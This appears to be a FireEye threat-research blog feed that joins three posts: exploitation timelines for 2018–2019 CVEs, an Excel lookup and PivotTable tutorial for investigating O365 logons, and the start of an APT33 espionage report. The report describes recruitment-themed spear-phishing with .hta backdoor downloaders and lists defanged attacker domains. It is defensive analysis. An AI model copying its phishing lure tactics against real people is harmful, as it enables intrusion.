  their toolsets following public disclosure and the fact that multiple
  disparate groups have repeatedly leveraged the same vulnerabilities in
  independent campaigns. Successful operations by these types of groups
  are likely to have a high potential impact.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Timeline of activity for CVE-2018-15982</span></p>
 <p>CVE-2018-15982: A use after free vulnerability in a file package in
  Adobe Flash Player 31.0.0.153 and earlier that, when exploited, allows
  an attacker to remotely execute arbitrary code. This vulnerability was
  exploited by espionage groups—Russia's APT28 and North Korea's
  APT37—as well as TEMP.MetaStrike and other financially motivated attackers.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: Timeline of activity for CVE-2018-20250</span></p>
 <p>CVE-2018-20250: A path traversal vulnerability exists within the ACE
  format in the archiver tool WinRAR versions 5.61 and earlier that,
  when exploited, allows an attacker to locally execute arbitrary code.
  This vulnerability was exploited by multiple espionage groups,
  including Chinese, North Korean, and Russian, groups, as well as
  Iranian groups APT33 and TEMP.Zagros.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Timeline of Activity for CVE-2018-4878</span></p>
 <p>CVE-2018-4878: A use after free vulnerability exists within the
  DRMManager’s “initialize” call in Adobe Flash Player 28.0.0.137 and
  earlier that, when exploited, allows an attacker to remotely execute
  arbitrary code. Mandiant Intelligence confirmed that North Korea’s
  APT37 exploited this vulnerability as a zero-day as early as September
  3, 2017. Within 8 days of disclosure, we observed Russia’s APT28 also
  leverage this vulnerability, with financially motivated attackers and
  North Korea’s TEMP.Hermit also using within approximately a month of disclosure.</p>
 <h4>Availability of PoC or Exploit Code</h4>
 <p>The availability of POC or exploit code on its own does not always
  increase the probability or speed of exploitation. However, we believe
  that POC code likely hastens exploitation attempts for vulnerabilities
  that do not require user interaction. For vulnerabilities that have
  already been exploited, the subsequent introduction of publicly
  available exploit or POC code indicates malicious actor interest and
  makes exploitation accessible to a wider range of attackers. There
  were a number of cases in which certain vulnerabilities were exploited
  on a large scale within 48 hours of PoC or exploit code availability
  (Table 2).</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="168"><p>
          <b>Time Between PoC or Exploit Code Publication and First
            Observed Potential Exploitation Events</b></p> </td> <td width="160"><p>
          <b>Product</b></p> </td> <td width="152"><p>
          <b>CVE</b></p> </td> <td width="144"><p>
          <b>FireEye Risk Rating</b></p> </td> </tr>
    <tr>
      <td width="168"><p>1 day</p> </td> <td width="160"><p>WinRAR</p>
      </td> <td width="152"><p>CVE-2018-20250</p> </td> <td
        width="144"><p>Medium</p> </td> </tr>
    <tr>
      <td width="168"><p>1 day</p> </td> <td width="160"><p>Drupal</p>
      </td> <td width="152"><p>CVE-2018-7600</p> </td> <td
        width="144"><p>High</p> </td> </tr>
    <tr>
      <td width="168"><p>1 day</p> </td> <td width="160"><p>Cisco
          Adaptive Security Appliance</p> </td> <td
        width="152"><p>CVE-2018-0296</p> </td> <td
        width="144"><p>Medium</p> </td> </tr>
    <tr>
      <td width="168"><p>2 days</p> </td> <td width="160"><p>Apache
        Struts</p> </td> <td width="152"><p>CVE-2018-11776</p> </td> <td
        width="144"><p>High</p> </td> </tr>
    <tr>
      <td width="168"><p>2 days</p> </td> <td width="160"><p>Cisco
          Adaptive Security Appliance</p> </td> <td
        width="152"><p>CVE-2018-0101</p> </td> <td
        width="144"><p>High</p> </td> </tr>
    <tr>
      <td width="168"><p>2 days</p> </td> <td width="160"><p>Oracle
          WebLogic Server</p> </td> <td width="152"><p>CVE-2018-2893</p>
      </td> <td width="144"><p>High</p> </td> </tr>
    <tr>
      <td width="168"><p>2 days</p> </td> <td width="160"><p>Microsoft
          Windows Server</p> </td> <td width="152"><p>CVE-2018-8440</p>
      </td> <td width="144"><p>Medium</p> </td> </tr>
    <tr>
      <td width="168"><p>2 days</p> </td> <td width="160"><p>Drupal</p>
      </td> <td width="152"><p>CVE-2019-6340</p> </td> <td
        width="144"><p>Medium</p> </td> </tr>
    <tr>
      <td width="168"><p>2 days</p> </td> <td width="160"><p>Atlassian
        Confluence</p> </td> <td width="152"><p>CVE-2019-3396</p> </td>
        <td width="144"><p>High</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 2: Vulnerabilities exploited within two
    days of either PoC or exploit code being made publicly available, Q1
    2018–Q3 2019</span></p>
 <h4>Trends by Targeted Products</h4>
 <p>FireEye judges that malicious actors are likely to most frequently
  leverage vulnerabilities based on a variety of factors that influence
  the utility of different vulnerabilities to their specific operations.
  For instance, we believe that attackers are most likely to target the
  most widely used products (see Figure 6). Attackers almost certainly
  also consider the cost and availability of an exploit for a specific
  vulnerability, the perceived success rate based on the delivery
  method, security measures introduced by vendors, and user awareness
  around certain products.</p>
 <p>The majority of observed vulnerabilities were for Microsoft
  products, likely due to the ubiquity of Microsoft offerings. In
  particular, vulnerabilities in software such as Microsoft Office Suite
  may be appealing to malicious actors based on the utility of email
  attached documents as initial infection vectors in phishing campaigns.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Exploited vulnerabilities by
    vendor, Q1 2018–Q3 2019</span></p>
 <h4>Outlook and Implications</h4>
 <p>The speed with which attackers exploit patched vulnerabilities
  emphasizes the importance of patching as quickly as possible. With the
  sheer quantity of vulnerabilities disclosed each year, however, it can
  be difficult for organizations with limited resources and business
  constraints to implement an effective strategy for prioritizing the
  most dangerous vulnerabilities. In upcoming blog posts, FireEye
  Mandiant Threat Intelligence describes our approach to vulnerability
  risk rating as well as strategies for making informed and realistic
  patch management decisions in more detail.</p>
 <p>We recommend using this exploitation trend information to better
  prioritize patching schedules in combination with other factors, such
  as known active threats to an organization's industry and geopolitical
  context, the availability of exploit and PoC code, commonly impacted
  vendors, and how widely software is deployed in an organization's
  environment may help to mitigate the risk of a large portion of
  malicious activity.</p>
 <p>Register today to hear FireEye Mandiant Threat Intelligence experts
  discuss the latest in <a
    href="https://www.brighttalk.com/webcast/7451/392772">vulnerability
    threats, trends and recommendations</a> in our upcoming April 30 webinar.</p>
http://www.fireeye.com/blog/threat-research/2020/04/time-between-disclosure-patch-release-and-vulnerability-exploitation.html2020-04-13T12:00:00.000Z2020-07-24T06:58:43.725ZExcelerating Analysis, Part 2 — X[LOOKUP] Gon’ Pivot To Yanoemail@noemail.orgJake Nicastro<p>In December 2019, we published a blog post on <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/12/tips-and-tricks-to-analyze-data-with-microsoft-excel.html">augmenting
    analysis using Microsoft Excel</a> for various data sets for
  incident response investigations. As we described, investigations
  often include custom or proprietary log formats and miscellaneous,
  non-traditional forensic artifacts. There are, of course, a variety of
  ways to tackle this task, but Excel stands out as a reliable way to
  analyze and transform a majority of data sets we encounter.</p>
 <p>In our first post, we discussed summarizing verbose artifacts using
  the CONCAT function, converting timestamps using the TIME function,
  and using the COUNTIF function for log baselining. In this post, we
  will cover two additional versatile features of Excel: LOOKUP
  functions and PivotTables.</p>
 <p>For this scenario, we will use a dataset of logon events for an
  example Microsoft Office 365 (O365) instance to demonstrate how an
  analyst can enrich information in the dataset. Then we will
  demonstrate some examples of how to use PivotTables to summarize
  information and highlight anomalies in the data quickly.</p>
 <p>Our data contains the following columns:</p>
 <ul> <li>Description – Event description</li> <li>User – User’s
  name</li> <li>User Principle Name – email address</li> <li>App – such
    as Office 365, Sharepoint, etc.</li> <li>Location – Country</li>
  <li>Date</li> <li>IP address</li> <li>User agent (simplified)</li>
    <li>Organization – associated with IP address (as identified by
  O365)</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: O365 data set</span></p>
 <h4>LOOKUP for Data Enrichment</h4>
 <p>It may be useful to add more information to the data that could help
  us in analysis that isn’t provided by the original log source. A step
  FireEye Mandiant often performs during investigations is to take all
  unique IP addresses and query threat intelligence sources for each IP
  address for reputation, WHOIS information, connections to known threat
  actor activity, etc. This grants more information about each IP
  address that we can take into consideration in our analysis.</p>
 <p>While FireEye Mandiant is privy to historical engagement data and <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">Mandiant
    Threat Intelligence</a>, if security teams or organizations do not
  have access to commercial threat intelligence feeds, there are
  numerous open source intelligence services that can be leveraged.</p>
 <p>We can also use IP address geolocation services to obtain latitude
  and longitude related to each source IP address. This information may
  be useful in identifying anomalous logons based on geographical location.</p>
 <p>After taking all source IP addresses, running them against threat
  intelligence feeds and geolocating them, we have the following data
  added to a second sheet called “IP Address Intel” in our Excel document:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: IP address enrichment</span></p>
 <p>We can already see before we even dive into the logs themselves that
  we have suspicious activity: The five IP addresses in the
  203.0.113.0/24 range in our data are known to be associated with
  activity connected to a fictional threat actor tracked as TMP.OGRE.</p>
 <p>To enrich our original dataset, we will add three columns to our
  data to integrate the supplementary information: “Latitude,”
  “Longitude,” and “Threat Intel” (Figure 3). We can use the VLOOKUP or
  XLOOKUP functions to quickly retrieve the supplementary data and
  integrate it into our main O365 log sheet.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Enrichment columns</span></p>
 <h4>VLOOKUP</h4>
 <p>The traditional way to look up particular data in another array is
  by using the <a
    href="https://support.office.com/en-us/article/vlookup-function-0bbc8083-26fe-4963-8ab8-93a18ad188a1">VLOOKUP
  function</a>. We will use the following formula to reference the
  “Latitude” values for a given IP address:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: VLOOKUP formula for Latitude</span></p>
 <p>There are four parts to this formula:</p>
 <ol> <li>Value to look up:<ul> <li>This dictates what cell value we are
        going to look up more information for. In this case, it is cell
        G2, which is the IP address.</li> </ul> </li> <li>Table
      array:<ul> <li>This defines the entire array in which we will look
        up our value and return data from. The first column in the array
        must contain the value being looked up. In the aforementioned
        example, we are searching in ‘IP Address Intel’!$A$2:$D:$15. In
        other words, we are looking in the other sheet in this workbook
        we created earlier titled “IP Address Intel”, then in that
        sheet, search in the cell range of A2 to D15.<br /> <br /> <img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture5.png"
        alt="" /> <span class="type-XS">Figure 5: VLOOKUP table
          array<br />  </span>
        <br /> Note the use of the “$” to ensure these are absolute
        references and will not be updated by Excel if we copy this
        formula to other cells.</li> </ul> </li> <li>Column index
      number:<ul> <li>This identifies the column number from which to
        return data. The first column is considered column 1. We want to
        return the “Latitude” value for the given IP address, so in the
        aforementioned example, we tell Excel to return data from column
      2.</li> </ul> </li> <li>Range lookup (match type)<ul> <li>This
        part of the formula tells Excel what type of matching to perform
        on the value being looked up. Excel defaults to “Approximate”
        matching, which assumes the data is sorted and will match the
        closest value. We want to perform “Exact” matching, so we put
        “0” here (“FALSE” is also accepted).</li> </ul> </li> </ol>
 <p>With the VLOOKUP function complete for the “Latitude” data, we can
    <a
    href="https://support.office.com/en-us/article/copy-a-formula-by-dragging-the-fill-handle-in-excel-for-mac-dd928259-622b-473f-9a33-83aa1a63e218">use
    the fill handle</a> to update this field for the rest of the data set.</p>
 <p>To get the values for the “Longitude” and “Threat Intel” columns, we
  repeat the process by using a similar function and, adjusting the
  column index number to reference the appropriate columns, then use the
  fill handle to fill in the rest of the column in our O365 data sheet:</p>
 <ul> <li>For Longitude:<ul> <li>=VLOOKUP(G2,'IP Address
      Intel'!$A$2:$D$15,<b>3</b>,0)</li> </ul> </li> <li>For Threat
      Intel:<ul> <li>=VLOOKUP(G2,'IP Address
      Intel'!$A$2:$D$15,<b>4</b>,0)</li> </ul> </li> </ul>
 <h4>Bonus Option: XLOOKUP</h4>
 <p>The <a
    href="https://support.office.com/en-us/article/xlookup-function-b7fd680e-6d10-43e6-84f9-88eae8bf5929">XLOOKUP
  function</a> in Excel is a more efficient way to reference the threat
  intelligence data sheet. XLOOKUP is a newer function introduced to
  Excel to replace the legacy VLOOKUP function and, at the time of
  writing this post, is only available to “O365 subscribers in the
  Monthly channel”, according to Microsoft. In this instance, we will
  also leverage Excel’s <a
    href="https://blog-insider.office.com/2019/06/13/dynamic-arrays-and-new-functions-in-excel/">dynamic
    arrays and “spilling”</a> to fill in this data more efficiently,
  instead of making an XLOOKUP function for each column.</p>
 <p>NOTE: To utilize dynamic arrays and spilling, the data we are
  seeking to enrich cannot be in the form of a “Table” object. Instead,
  we will apply filters to the top row of our O365 data set by selecting
  the “Filter” option under “Sort &amp; Filter” in the “Home” ribbon:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Filter option</span></p>
 <p>To reference the threat intelligence data sheet using XLOOKUP, we
  will use the following formula:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: XLOOKUP function for enrichment</span></p>
 <p>There are three parts to this XLOOKUP formula:</p>
 <ol> <li>Value to lookup:<ul> <li>This dictates what cell value we are
        going to look up more information for. In this case, it is cell
        G2, which is the IP address.</li> </ul> </li> <li>Array to look
      in:<ul> <li>This will be the array of data in which Excel will
        search for the value to look up. Excel does exact matching by
        default for XLOOKUP. In the aforementioned example, we are
        searching in ‘IP Address Intel’!$A$2:$A:$15. In other words, we
        are looking in the other sheet in this workbook titled “IP
        Address Intel”, then in that sheet, search in the cell range of
        A2 to A15:<br /> <br /> <img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture8.png"
        alt="" /> <span class="type-XS">Figure 8: XLOOKUP array to look
          in<br />  </span>
        <br /> Note the use of the “$” to ensure these are absolute
        references and will not be updated by Excel if we copy this
        formula to other cells.</li> </ul> </li> <li>Array of data to
      return:<ul> <li>This part will be the array of data from which
        Excel will return data. In this case, Excel will return the data
        contained within the absolute range of B2 to D15 from the “IP
        Address Intel” sheet for the value that was looked up. In the
        aforementioned example formula, it will return the values in the
        row for the IP address 198.51.100.126:<br /> <br /> <img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture9.png"
        alt="" /> <span class="type-XS">Figure 9: Data to be returned
          from ‘IP Address Intel’ sheet<br />  </span>
        <br /> Because this is leveraging dynamic arrays and spilling,
        all three cells of the returned data will populate, as seen in
        Figure 4.</li> </ul> </li> </ol>
 <p>Now that our dataset is completely enriched by either using VLOOKUP
  or XLOOKUP, we can start hunting for anomalous activity. As a quick
  first step, since we know at least a handful of IP addresses are
  potentially malicious, we can filter on the “Threat Intel” column for
  all rows that match “TMP.OGRE” and reveal logons with source IP
  addresses related to known threat actors. Now we have timeframes and
  suspected compromised accounts to <i>pivot</i> off of for additional
  hunting through other data.</p>
 <h4>PIVOT! PIVOT! PIVOT!</h4>
 <p>One of the most useful tools for highlighting anomalies by
  summarizing data, performing frequency analysis and quickly obtaining
  other statistics about a given dataset is Excel’s <a
    href="https://support.office.com/en-us/article/create-a-pivottable-to-analyze-worksheet-data-a9a84538-bfe9-40a9-a8e9-f99134456576">PivotTable function</a>.</p>
 <h4>Location Anomalies</h4>
 <p>Let’s utilize a PivotTable to perform frequency analysis on the
  location from which users logged in. This type of technique may
  highlight activity where a user account logged in from a location
  which is unusual for them.</p>
 <p>To create a PivotTable for our data, we can select any cell in our
  O365 data and select the entire range with Ctrl+A. Then, under the
  “Insert” tab in the ribbon, select “PivotTable”:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: PivotTable selection</span></p>
 <p>This will bring up a window, as seen in Figure 11, to confirm the
  data for which we want to make a PivotTable (Step 1 in Figure 11).
  Since we selected our O365 log data set with Ctrl+A, this should be
  automatically populated. It will also ask where we want to put the
  PivotTable (Step 2 in Figure 11). In this instance, we created another
  sheet called “PivotTable 1” to place the PivotTable:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture11.png" alt="" />
  <br /> <span class="type-XS">Figure 11: PivotTable creation</span></p>
 <p>Now that the PivotTable is created, we must select how we want to
  populate the PivotTable using our data. Remember, we are trying to
  determine the locations from which all users logged in. We will want a
  row for each user and a sub-row for each location the user has logged
  in from. Let’s add a count of how many times they logged in from each
  location as well. We will use the “Date” field to do this for this example:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture12.png" alt="" />
  <br /> <span class="type-XS">Figure 12: PivotTable field definitions</span></p>
 <p>Examining this table, we can immediately see there are two users
  with source location anomalies: Ginger Breadman and William Brody have
  a small number of logons from “FarFarAway”, which is abnormal for
  these users based on this data set.</p>
 <p>We can add more data to this PivotTable to get a timeframe of this
  suspicious activity by adding two more “Date” fields to the “Values”
  area. Excel defaults to “Count” of whatever field we drop in this
  area, but we will change this to the “Minimum” and “Maximum” values by
  using the “Value Field Settings”, as seen in Figure 13.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture13.png" alt="" />
  <br /> <span class="type-XS">Figure 13: Adding min and max dates</span></p>
 <p>Now we have a PivotTable that shows us anomalous locations for
  logons, as well as the timeframe in which the logons occurred, so we
  can hone our investigation. For this example, we also formatted all
  cells with timestamp values to reflect the format FireEye Mandiant
  typically uses during analysis by selecting all the appropriate cells,
  right-clicking and choosing “Format Cells”, and using a “Custom”
  format of “YYYY-MM-DD HH:MM:SS”.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture14.png" alt="" />
  <br /> <span class="type-XS">Figure 14: PivotTable with suspicious
    locations and timeframe</span></p>
 <h4>IP Address Anomalies</h4>
 <p>Geolocation anomalies may not always be valuable. However, using a
  similar configuration as the previous example, we can identify
  suspicious source IP addresses. We will add “User Principle Name” and
  “IP Address” fields as Rows, and “IP Address” as Values. Let’s also
  add the “App” field to Columns. Our field settings and resulting table
  are displayed in Figure 15:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture15.png" alt="" />
  <br /> <span class="type-XS">Figure 15: PivotTable with IP addresses
    and apps</span></p>
 <p>With just a few clicks, we have a summarized table indicating which
  IP addresses each user logged in from, and which app they logged into.
  We can quickly identify two users logged in from IP addresses in the
  203.0.113.0/24 range six times, and which applications they logged
  into from each of these IP addresses.</p>
 <p>While these are just a couple use cases, there are many ways to
  format and view evidence using PivotTables. We recommend trying
  PivotTables on any data set being reviewed with Excel and
  experimenting with the Rows, Columns, and Values parameters.</p>
 <p>We also recommend adjusting the <a
    href="https://support.office.com/en-us/article/pivottable-options-27c02eb7-27de-4b3f-9677-c48e3fe7637b">PivotTable
  options</a>, which can help reformat the table itself into a format
  that might fit requirements.</p>
 <h4>Conclusion</h4>
 <p>These Excel functions are used frequently during investigations at
  FireEye Mandiant and are considered important forensic analysis
  techniques. The examples we give here are just a glimpse into the
  utility of LOOKUP functions and PivotTables. LOOKUP functions can be
  used to reference a multitude of data sources and can be applied in
  other situations during investigations such as tracking remediation
  and analysis efforts.</p>
 <p>PivotTables may be used in a variety of ways as well, depending on
  what data is available, and what sort of information is being analyzed
  to identify suspicious activity. Employing these techniques, alongside
  the ones we highlighted previously, on a consistent basis will go a
  long way in &quot;excelerating&quot; forensic analysis skills and efficiency.</p>
http://www.fireeye.com/blog/threat-research/2020/04/excelerating-analysis-lookup-pivot.html2020-04-28T17:30:00.000Z2020-07-24T06:58:43.740ZInsights into Iranian Cyber Espionage: APT33 Targets Aerospace and
Energy Sectors and has Ties to Destructive Malwarenoemail@noemail.orgJacqueline O’Leary<p>When discussing suspected Middle Eastern hacker groups with
  destructive capabilities, many automatically think of the <a
    href="/content/fireeye-www/en_US/blog/threat-research/2016/11/fireeye_respondsto.html">suspected
    Iranian group</a> that previously used SHAMOON – aka <a
  href="https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Trojan%3AWin32%2FWipMBR.B">Disttrack</a>
  – to target organizations in the Persian Gulf. However, over the past
  few years, we have been tracking a separate, less widely known
  suspected Iranian group with potential destructive capabilities, whom
  we call APT33. Our analysis reveals that APT33 is a capable group that
  has carried out cyber espionage operations since at least 2013. We
  assess APT33 works at the behest of the Iranian government.</p>
 <p>Recent investigations by FireEye’s <a
    href="/content/fireeye-www/en_US/services.html">Mandiant incident
  response</a> consultants combined with FireEye iSIGHT Threat
  Intelligence analysis have given us a more complete picture of APT33’s
  operations, capabilities, and potential motivations. This blog
  highlights some of our analysis. Our detailed report on <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence/threat-intelligence-subscriptions.html">FireEye
    Threat Intelligence</a> contains a more thorough review of our
  supporting evidence and analysis. We will also be discussing this
  threat group further during our <a
  href="https://www.brighttalk.com/webcast/10703/275683?utm_source=FireEye_blog">webinar</a>
  on Sept. 21 at 8 a.m. ET.</p>
 <h4>Targeting</h4>
 <p>APT33 has targeted organizations – spanning multiple industries –
  headquartered in the United States, Saudi Arabia and South Korea.
  APT33 has shown particular interest in organizations in the aviation
  sector involved in both military and commercial capacities, as well as
  organizations in the energy sector with ties to petrochemical production.</p>
 <p>From mid-2016 through early 2017, APT33 compromised a U.S.
  organization in the aerospace sector and targeted a business
  conglomerate located in Saudi Arabia with aviation holdings.</p>
 <p>During the same time period, APT33 also targeted a South Korean
  company involved in oil refining and petrochemicals. More recently, in
  May 2017, APT33 appeared to target a Saudi organization and a South
  Korean business conglomerate using a malicious file that attempted to
  entice victims with job vacancies for a Saudi Arabian petrochemical company.</p>
 <p>We assess the targeting of multiple companies with aviation-related
  partnerships to Saudi Arabia indicates that APT33 may possibly be
  looking to gain insights on Saudi Arabia’s military aviation
  capabilities to enhance Iran’s domestic aviation capabilities or to
  support Iran’s military and strategic decision making vis a vis Saudi Arabia.</p>
 <p>We believe the targeting of the Saudi organization may have been an
  attempt to gain insight into regional rivals, while the targeting of
  South Korean companies may be due to South Korea’s recent partnerships
  with Iran’s petrochemical industry as well as South Korea’s
  relationships with Saudi petrochemical companies. Iran has <a
    href="https://financialtribune.com/articles/energy/41665/call-for-restoring-past-petrochemical-status">expressed
  interest</a> in growing their petrochemical industry and often posited
  this expansion in competition to Saudi petrochemical companies. APT33
  may have targeted these organizations as a result of Iran’s desire to
  expand its own petrochemical production and improve its
  competitiveness within the region. </p>
 <p>The generalized targeting of organizations involved in energy and
  petrochemicals mirrors previously observed targeting by other
  suspected Iranian threat groups, indicating a common interest in the
  sectors across Iranian actors.</p>
 <p>Figure 1 shows the global scope of APT33 targeting.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig1.jpg" />
  <br /> <span class="type-XS">Figure 1: Scope of APT33 Targeting</span></p>
 <h4>Spear Phishing</h4>
 <p>APT33 sent spear phishing emails to employees whose jobs related to
  the aviation industry. These emails included recruitment themed lures
  and contained links to malicious HTML application (.hta) files. The
  .hta files contained job descriptions and links to legitimate job
  postings on popular employment websites that would be relevant to the
  targeted individuals.</p>
 <p>An example .hta file excerpt is provided in Figure 2. To the user,
  the file would appear as benign references to legitimate job postings;
  however, unbeknownst to the user, the .hta file also contained
  embedded code that automatically downloaded a custom APT33 backdoor.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig2.png" />
  <br /> <span class="type-XS">Figure 2: Excerpt of an APT33 malicious
    .hta file</span></p>
 <p>We assess APT33 used a built-in phishing module within the publicly
  available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear
  phishing emails to targeted individuals in 2016. Many of the phishing
  emails appeared legitimate – they referenced a specific job
  opportunity and salary, provided a link to the spoofed company’s
  employment website, and even included the spoofed company’s Equal
  Opportunity hiring statement. However, in a few cases, APT33 operators
  left in the default values of the shell’s phishing module. These
  appear to be mistakes, as minutes after sending the emails with the
  default values, APT33 sent emails to the same recipients with the
  default values removed.</p>
 <p>As shown in Figure 3, the “fake mail” phishing module in the ALFA
  Shell contains default values, including the sender email address
  (solevisible@gmail[.]com), subject line (“your site hacked by me”),
  and email body (“Hi Dear Admin”).</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig3.png" />
  <br /> <span class="type-XS">Figure 3: ALFA TEaM Shell v2-Fake Mail (Default)</span></p>
 <p>Figure 4 shows an example email containing the default values the shell.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig4.png" />
  <br /> <span class="type-XS">Figure 4: Example Email Generated by the
    ALFA Shell with Default Values</span></p>
 <h4>Domain Masquerading</h4>
 <p>APT33 registered multiple domains that masquerade as Saudi Arabian
  aviation companies and Western organizations that together have
  partnerships to provide training, maintenance and support for Saudi’s
  military and commercial fleet. Based on observed targeting patterns,
  APT33 likely used these domains in spear phishing emails to target
  victim organizations.    </p>
 <p>The following domains masquerade as these organizations: Boeing,
  Alsalam Aircraft Company, Northrop Grumman Aviation Arabia (NGAAKSA),
  and Vinnell Arabia.</p>
 <table cellspacing="0" cellpadding="0" border="1" width="238"> <tbody>
    <tr>
      <td width="238" valign="top"><p>boeing.servehttp[.]com</p> </td> </tr>
    <tr>
      <td width="238" valign="top"><p>alsalam.ddns[.]net</p> </td> </tr>
    <tr>
      <td width="238" valign="top"><p>ngaaksa.ddns[.]net</p> </td> </tr>
    <tr>
      <td width="238" valign="top"><p>ngaaksa.sytes[.]net</p> </td> </tr>
    <tr>
      <td width="238" valign="top"><p>vinnellarabia.myftp[.]org</p>
      </td> </tr></tbody></table>
 <p>Boeing, Alsalam Aircraft company, and Saudia Aerospace Engineering
  Industries entered into a <a
    href="http://boeing.mediaroom.com/2015-08-26-Boeing-Saudia-Aerospace-Engineering-Industries-and-Alsalam-Aircraft-Company-to-Establish-Saudi-Rotorcraft-Support-Center-in-Saudi-Arabia">joint
  venture</a> to create the Saudi Rotorcraft Support Center in Saudi
  Arabia in 2015 with the goal of servicing Saudi Arabia’s <a
    href="https://www.aerosociety.com/Assets/Docs/Publications/SpecialistPapers/Definition_of_a_Rotorcraft.pdf">rotorcraft
  fleet</a> and building a self-sustaining workforce in the Saudi
  aerospace supply base.</p>
 <p>Alsalam Aircraft Company also offers military and commercial
  maintenance, technical support, and interior design and refurbishment services.</p>
 <p>Two of the domains appeared to mimic Northrop Grumman joint
  ventures. These <a
    href="http://www.northropgrumman.com/Capabilities/RotaryWingAviation/Pages/default.aspx">joint
  ventures</a> – Vinnell Arabia and Northrop Grumman Aviation Arabia –
  provide aviation support in the Middle East, specifically in Saudi
  Arabia. Both Vinnell Arabia and Northrop Grumman Aviation Arabia have
  been involved in <a
  href="http://www.prnewswire.com/news-releases/northrop-grumman-forms-industry-leading-team-for-ministry-of-national-guard-aviation-support-contract-saudi-arabia-234754491.html">contracts</a>
  to train Saudi Arabia’s Ministry of National Guard.</p>
 <h4>Identified Persona Linked to Iranian Government</h4>
 <p>We identified APT33 malware tied to an Iranian persona who may have
  been employed by the Iranian government to conduct cyber threat
  activity against its adversaries.</p>
 <p>We assess an actor using the handle “xman_1365_x” may have been
  involved in the development and potential use of APT33’s TURNEDUP
  backdoor due to the inclusion of the handle in the
  processing-debugging (PDB) paths of many of TURNEDUP samples. An
  example can be seen in Figure 5.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT33/Fig6.png" />
  <br /> <span class="type-XS">Figure 5: “xman_1365_x&quot; PDB String
    in TURNEDUP Sample</span></p>
 <p>Xman_1365_x was also a community manager in the Barnamenevis Iranian
  programming and software engineering forum, and registered accounts in
  the well-known Iranian Shabgard and Ashiyane forums, though we did not
  find evidence to suggest that this actor was ever a formal member of
  the Shabgard or Ashiyane hacktivist groups.</p>
 <p>Open source reporting links the “xman_1365_x” actor to the “Nasr
  Institute,” which is purported to be equivalent to Iran’s “cyber army”
  and controlled by the Iranian government. Separately, additional
  evidence ties the “Nasr Institute” to the 2011-2013 attacks on the
  financial industry, a series of denial of service attacks dubbed
  Operation Ababil. In March 2016, the U.S. Department of Justice
  unsealed an <a
  href="https://www.justice.gov/usao-sdny/file/835061/download">indictment</a> that
  named two individuals allegedly hired by the Iranian government to
  build attack infrastructure and conduct distributed denial of service
  attacks in support of Operation Ababil. While the individuals and the
  activity described in indictment are different than what is discussed
  in this report, it provides some evidence that individuals associated
  with the “Nasr Institute” may have ties to the Iranian government.</p>
 <h4>Potential Ties to Destructive Capabilities and Comparisons with SHAMOON</h4>
 <p>One of the droppers used by APT33, which we refer to as DROPSHOT,
  has been linked to the wiper malware SHAPESHIFT. Open source research
  indicates SHAPESHIFT may have been used to target organizations in
  Saudi Arabia.</p>
 <p>Although we have only directly observed APT33 use DROPSHOT to
  deliver the TURNEDUP backdoor, we have identified multiple DROPSHOT
  samples in the wild that drop SHAPESHIFT. The SHAPESHIFT malware is
  capable of wiping disks, erasing volumes and deleting files, depending
  on its configuration. Both DROPSHOT and SHAPESHIFT contain Farsi
  language artifacts, which indicates they may have been developed by a
  Farsi language speaker (Farsi is the predominant and official language
  of Iran).</p>
